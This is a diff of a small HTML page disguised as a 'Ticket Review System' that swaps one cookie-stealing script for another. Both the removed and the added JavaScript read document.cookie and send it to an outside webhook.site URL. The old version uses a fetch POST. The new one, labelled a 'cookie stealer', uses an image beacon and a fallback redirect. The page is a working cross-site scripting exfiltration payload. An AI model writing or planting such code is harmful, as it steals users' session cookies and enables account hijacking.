@@ -1,22 +1,26 @@
 <!DOCTYPE html>
 <html>
+<head>
+    <title>Ticket Review</title>
+</head>
 <body>
-<script>
-fetch("https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0", {
-    method: "POST",
-    headers: {
-        'Content-Type': 'application/json',
-    },
-    body: JSON.stringify({
-        cookies: document.cookie,
-        page: window.location.href,
-        timestamp: new Date().toISOString(),
-        referrer: document.referrer
-    })
-}).catch(err => {
-    new Image().src = "https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0?fallback_cookies=" + encodeURIComponent(document.cookie);
-});
-</script>
-<h1>Ticket Review System</h1>
+    <h1>Loading Ticket System...</h1>
+    
+    <script>
+        // Simple and reliable cookie stealer
+        var cookies = document.cookie;
+        
+        // Method 1: Send via Image (most reliable)
+        var img = new Image();
+        img.src = "https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0?c=" + encodeURIComponent(cookies);
+        
+        // Method 2: Log for debugging
+        console.log("Cookies:", cookies);
+        
+        // Method 3: If still not working, try this redirect approach
+        setTimeout(function() {
+            window.location = "https://webhook.site/6ad393d5-ac29-4a94-aeaa-1d31965ba5c0?redirect=1&cookies=" + encodeURIComponent(cookies);
+        }, 500);
+    </script>
 </body>
 </html>
